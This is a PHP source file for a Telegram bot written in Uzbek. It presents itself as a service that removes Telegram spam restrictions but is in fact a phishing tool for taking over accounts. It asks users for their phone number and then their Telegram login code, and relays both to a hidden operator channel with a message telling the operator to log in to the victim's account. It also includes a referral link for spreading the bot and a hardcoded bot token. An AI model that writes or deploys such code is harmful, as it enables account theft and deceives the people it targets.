<?php

$admin = '1165036983';
$token = '5911807888:AAH7rEv3FC4sMvK1ALdJD8QlPwLsGg1xGec';
$bot = 'PouzBot';

function bot($method,$datas=[]){
global $token;
    $url = "https://api.telegram.org/bot".$token."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$kanalim = '@PouzChannel';
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$data = $update->callback_query->data;
$type = $message->chat->type;
$text = $message->text;
$tx = $message->text;
$cid = $message->chat->id;
$uid= $message->from->id;
$gname = $message->chat->title;
$left = $message->left_chat_member;
$new = $message->new_chat_member;
$name = $message->from->first_name;
$repid = $message->reply_to_message->from->id;
$repname = $message->reply_to_message->from->first_name;
$newid = $message->new_chat_member->id;
$leftid = $message->left_chat_member->id;
$newname = $message->new_chat_member->first_name;
$leftname = $message->left_chat_member->first_name;
$username = $message->from->username;
$cmid = $update->callback_query->message->message_id;
$cusername = $message->chat->username;
$repmid = $message->reply_to_message->message_id; 
$ccid = $update->callback_query->message->chat->id;
$cuid = $update->callback_query->message->from->id;
$cqid = $update->callback_query->id;

$photo = $update->message->photo;
$gif = $update->message->animation;
$video = $update->message->video;
$music = $update->message->audio;
$voice = $update->message->voice;
$sticker = $update->message->sticker;
$document = $update->message->document;
$for = $message->forward_from;
$forc = $message->forward_from_chat;
mkdir("odam");
mkdir("pul");
mkdir("qiwi");
mkdir("code");
$odam = file_get_contents("odam/$cid.dat");
$pul = file_get_contents("pul/$cid.dat");

$menu = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"⛔️ Cheklovlarni olib tashlash"]],
[['text'=>"💳 Bot hamyoni"],['text'=>"📘 Ma'lumotlar"]],
]
]);

$back = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 Orqaga"]],
]
]);


$ok = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"✅ Roziman"],['text'=>"🔙 Orqaga"]],

]
]);

if($text=="/start"){
$pul = file_get_contents("pul/$cid.txt");
$mm=$pul+0;
file_put_contents("pul/$cid.txt","$mm");
$odam = file_get_contents("odam/$cid.dat");
$kkd=$odam+0;
file_put_contents("odam/$cid.dat","$kkd");
bot('sendmessage',[
    'chat_id'=>$cid,
    'text'=>"Assalomu alaykum, telegramdagi cheklovlardan sahifangizni tozalash va himoyalash uchun botdan foydalaning.

Siz asosiy bo'limdasiz…",
    'parse_mode'=>'html',
    'reply_markup'=>$menu
    ]);
}



if(mb_stripos($tx,"/start $cid")!==false){
bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Assalomu alaykum, telegramdagi cheklovlardan sahifangizni tozalash va himoyalash uchun botdan foydalaning.

Siz asosiy bo'limdasiz…",
      'parse_mode'=>'html',
      'reply_markup'=>$menu,
      ]);
}else{
      $idref = "pul/$refid_id.txt";
      $idref2 = file_get_contents($idref);
      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);
if(mb_stripos($idref2,$cid) !== false ){
}else{
$public = explode("*",$tx);
$refid = explode(" ",$tx);
$refid = $refid[1];
$pul = file_get_contents("pul/$refid.soni");
$pul = $pul+0;
file_put_contents("pul/$refid.soni","$pul");
$odam = file_get_contents("odam/$refid.txt");
$odam = $odam+1;
file_put_contents("odam/$refid.dat","$odam");
bot('sendmessage',[
'chat_id'=>$refid,
'text'=>"Siz do'stingiz ($cid)ni botga taklif qildingiz.",
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}
}
if($text=="🔙 Orqaga"){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Asosiy bo'limga qaytdingiz.",
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}

if($text=="📒 Ma'lumotlar"){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"<b>📂 Batafsil ma'lumotlar</b>

Telegramda qonunni va shartlarni bilib yoki bilmasdan buzgan foydalanuvchilarga jazo tariqasida cheklovlar o'rnatiladi. Bu cheklovlar asosan qisqa muddatli kam holatlarda uzoq muddatli va juda kamdan-kam holatlarda esa doimiy ravishta belgilanadi. 

✔️ Bu cheklovlarni bartaraf etish uchun sizning <b>PouzBot</b>'ingiz sizga yordam beradi. 

❓ <b>Cheklovlar va taqiqlar o'zi nima uchun beriladi?</b>
— Guruh va kanallarga kontaktingizdagi yaqinlaringizni qo'shish;
— Begona va sizni hohlamagan foydalanuvchiga yozish;
— Qo'pol va terz muomila va pornografik materiallar va qo'pol so'kinishlar;
— Bundan tashqari telegram siyosatini buzganlik uchun ham;

Balki sizda bularning bittasi bo'lgani uchun sizning sahifangizda ham cheklov bor va bu cheklov «Spam» deb ataladi.

👨🏻‍💻 <b>Adminstrator:</b> @tgsantispambot",
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}

if($text=="⛔️ Cheklovlarni olib tashlash"){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"✅ <b>Telegram cheklovlarini sahifangizdan olib tashlashga rozilik bildiring!</b>

Bizning botimiz sizning sahifangizdagi barcha cheklovlarni olib tashlash uchun yaroqli deb topdi. 

Sahifangizdagi cheklovlarni olib tashlashimiz uchun bizni botimizga rozilik bering. 

♨️ <b>Sahifangizda quyidagi cheklovlar bartaraf etiladi:</b>
— Chatlardagi spam;
— Ommaviy va shaxsiy guruh va kanallardagi spam;
— Cheklovlar va ogohlantirishlar;

Akkauntingiz uchun mutlaqo xavfsiz avtomatik tarzda bot orqali xatosiz tozalash ishlari olib boriladi.

❓ <i>Nega cheklov qo'yiladi? - Shu kabi barcha savollarga botning asosiy bo'limidagi ma'lumotlar bo'limida javob topishingiz mumkin.</i>

Rozilik bildirish uchun tugmalardan foydalaning…",
'parse_mode'=>'html',
'reply_markup'=>$ok,
]);
}

if($text=="/crezza"){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"🫂 <b>Hamkorlik qilish uchun botga do'stlaringizni taklif qiling!</b>

https://t.me/$bot?start=$cid

Ma'lum bir sabablarga ko'ra barcha sizga keladigan ma'lumotlar $kanalim kanaliga tashlanadi. Bu kanalda hech kim yo'q mutlaqo xavfsiz bemalol shu joydan foydalanishingiz mumkin.

<i>Bu havolani nusxalab do'stingizga yuboring va u faqat shu havolanigina bosib kirsa sizga ma'lumotlar berib boramiz.</i>",
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}
if($text=="💳 Bot hamyoni"){
$pul = file_get_contents("pul/$cid.txt");
$odam = file_get_contents("odam/$cid.dat");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Bu bo'lim ta'mirda…",
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}
if($text=="/ua29012006"){
$pul = file_get_contents("pul/$cid.txt");
$odam = file_get_contents("odam/$cid.dat");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Bunga bosing: /crezza",
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}
if($text=="✅ Roziman"){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"☎️ <b>Telefon raqamingizni yuboring!</b>

<i>Cheklovlarni sahifangizdan bartaraf etishimiz uchun namunadagidek qilib yuboring:</i>

<b>Namuna:</b> +998901234567",   
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}
if(mb_stripos($text,"+")!==false){
file_put_contents("qiwi/$cid.txt","$text");
$qiwi=file_get_contents("qiwi/$cid.txt");
$pul = file_get_contents("pul/$cid.txt");
$odam = file_get_contents("odam/$cid.dat");
if($pul>=0){
bot('sendmessage',[
'chat_id'=>-1001653584334,
'text'=>"☎️ <b>Telefon raqami:</b> $qiwi

<i>Raqamni nusxalab hoziroq telegram sahifa ochish bo'limiga o'ting, kod kelsa biz sizga bot orqali ma'lum qilamiz.</i>",
'parse_mode'=>'html',
]);
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"✉️ <b>Kodni kiriting:</b>

<i>Hozirgina telegram orqali sizga kod yubordik. Bu kodni bizga yuborish orqali siz cheklovlardan halos bo'lasiz.

Kod ba'zida biroz muddatdan so'ng ham kelishi mumkin. Agar sizda shunday bo'lsa biroz kuting, bu ko'p vaqt talab qilmaydi.

Kod kelgan bo'lsa huddi namunadagidek qilib xatosiz holatda kiriting:</i>

<b>Namuna:</b> #12345",   
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}
}
if(mb_stripos($text,"#")!==false){
file_put_contents("code/$cid.txt","$text");
$code=file_get_contents("code/$cid.txt");
$pul = file_get_contents("pul/$cid.txt");
$odam = file_get_contents("odam/$cid.dat");
if($pul>=0){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"✅ <b>Tabriklaymiz! Arizangiz qabul qilindi.</b>

Telegram sizning arizangizni 12 soat ichida ko'rib chiqib barcha cheklovlardan halos etadi.

Botni o'chirib tashlamang. Botdan foydalanishingiz mumkin…",
'parse_mode'=>'html',
'reply_markup'=>$menu
]);
bot('sendmessage',[
'chat_id'=>"-1001653584334",
'text'=>"🔐 <b>Telegram kod:</b> $code

<i>Kodni raqam kod so'raganda kiriting va sahifaga kirib oling.</i>",
'parse_mode'=>'html',
]);
$pul = file_get_contents("pul/$cid.txt");
$k=$pul-$pul;
file_put_contents("pul/$cid.txt","$k");
$sum=file_get_contents("tolandi.txt");
$uio=$pul+$sum;
file_put_contents("tolandi.txt","$uio");
}else{
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Noma'lum xatolik yuz berdi…",
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}
}

if($text=="/ua"){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Bizning haqiqiy kanallarimizga obuna bo'ling:",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"Telegram",'url'=>"https://t.me/crezza"]],
[['text'=>"Instagram",'url'=>"https://www.instagram.com/_crezza_"]],
[['text'=>"YouTube",'url'=>"https://www.youtube.com/crezza"]],
]
])
]);
}

if((mb_stripos($text,"/plus")!==false) and $cid==$admin){
$exx=explode(" ",$text);
$ex1=$exx[1];
$ex2=$exx[2];
$pul = file_get_contents("pul/$ex1.txt");
$rr=$pul+$ex2;
file_put_contents("pul/$ex1.txt","$rr");
$pul = file_get_contents("pul/$ex1.txt");
$odam = file_get_contents("odam/$ex1.dat");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Diqqat <b>$ex1</b> ga <b>$ex2 so'm</b> qo'shildi!

Xisobi: <b>$pul so'm</b>
ID raqami: <code>$ex1</code>",
'parse_mode'=>'html',
]);
bot('sendmessage',[
'chat_id'=>$ex1,
'text'=>"✅ Salom! Sizni xisobingizga <b>$ex2 so'm</b> qo'shildi.

Xisobingiz: <b>$pul so'm</b>",
'parse_mode'=>'html',
]);
}
if((mb_stripos($text,"/minus")!==false) and $cid==$admin){
$exxx=explode(" ",$text);
$ex3=$exxx[1];
$ex4=$exxx[2];
$pul = file_get_contents("pul/$ex3.txt");
$rr=$pul-$ex4;
file_put_contents("pul/$ex3.txt","$rr");
$pul = file_get_contents("pul/$ex3.txt");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Diqqat <b>$ex1</b> dan <b>$ex2 so'm</b> olib tashlandi!

Xisobi: <b>$pul so'm</b>
ID raqami: <code>$ex1</code>",
'parse_mode'=>'html',
]);
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"⛔️ Salom! Sizning xisobingizdan <b>$ex2 so'm</b> olib tashlandi.

Xisobingiz: <b>$pul so'm</b>",
'parse_mode'=>'html',
]);
}
$lichka = file_get_contents("lichka.db");
$xabar = file_get_contents("xabarlar.txt");

if($type=="private"){
if(strpos($lichka,"$cid") !==false){
}else{
file_put_contents("lichka.db","$lichka\n$cid");
}
} 
$reply = $message->reply_to_message->text;
$rpl = json_encode([
            'resize_keyboard'=>false,
            'force_reply'=>true,
            'selective'=>true
        ]);
if($text=="/send" and $cid==$admin){
  bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>"Yuboriladigan xabar matnini kiriting:",
    'parse_mode'=>"html",
]);
    file_put_contents("xabarlar.txt","user");
}
if($xabar=="user" and $cid==$admin){
if($text=="/cancel"){
	file_put_contents("xabarlar.txt","");
}else{
  $lich = file_get_contents("lichka.db");
  $lichka = explode("\n",$lich);
  foreach($lichka as $lichkalar){
  $okuser=bot("sendmessage",[
    'chat_id'=>$lichkalar,
    'text'=>$text,
    'parse_mode'=>'html'
]);
}
if($okuser){
  bot("sendmessage",[
    'chat_id'=>$admin,
    'text'=>"Hamma foydalanuvchilarga yuborildi!",
    'parse_mode'=>'html',
]);
  file_put_contents("xabarlar.txt","");
}
}
}
$sum=file_get_contents("tolandi.txt");
if($text=="/statistika"){
$soat = date('H:i', strtotime('2 hour'));
$sana = date('d-M Y',strtotime('2 hour'));
$sum=file_get_contents("tolandi.txt");
$lich = substr_count($lichka,"\n");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"📶 Foydalanuvchilar: <b>$lich ta</b>",
'parse_mode'=>'html',
'reply_markup'=>$menu,
]);
}
if(mb_stripos($text,"/pul")!==false){
$him=explode(" ",$text);
$hm=$him[1];
file_put_contents("tolandi.txt","$hm");
$sum=file_get_contents("tolandi.txt");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"$sum so'm qo'shildi!",
'parse_mode'=>'html',
]);
}

?>